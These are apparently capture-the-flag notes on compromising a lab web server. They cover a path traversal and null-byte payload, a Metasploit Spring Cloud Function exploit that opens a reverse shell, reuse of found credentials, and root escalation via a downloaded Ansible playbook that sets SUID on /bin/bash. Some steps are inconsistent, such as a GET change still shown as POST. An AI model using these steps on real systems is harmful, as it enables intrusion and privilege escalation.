```
# After successfully upload an image the file path was shown

<h4 class="text-success">Uploaded!</h4>
<a class="text-success" href="/show_image?img=test2.php%00.jpg">View your Image

# Attempting to access the

POST /show_image?img=
/show_image?img=../../../../../home
HTTP/1.1

# Result in:
HTTP/1.1 405 

Allow: GET

Content-Type: text/html;charset=UTF-8

Content-Language: en

Content-Length: 449

Date: Tue, 02 May 2023 09:36:58 GMT

Connection: close


# Changing to GET allow the method to pass
POST /show_image?img=
/show_image?img=../../../../../home
HTTP/1.1

# The directory lsiting of /home is replied

checking /var/www/WebApp/HELP.md  revealed possible spring framework exploit

msfconsole

use exploit/multi/http/spring_cloud_function_spel_injection

set rhosts 10.10.11.204

set lhost tun0

exploit

shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

#User frank is obtained but the home directory does not contain flag

#There is .m2 directory in user frank home directory which reveals user phil credentials su phil and we get flag

#cd /opt have a task folder that is rwx by all users and will be executed as root

#Create our own payload on local machine

- hosts: localhost
  become: true
  tasks:
    - name: Run test.sh script
      command: chmod u+s /bin/bash

wget playbook2.yml 

bash -p and we get root

```
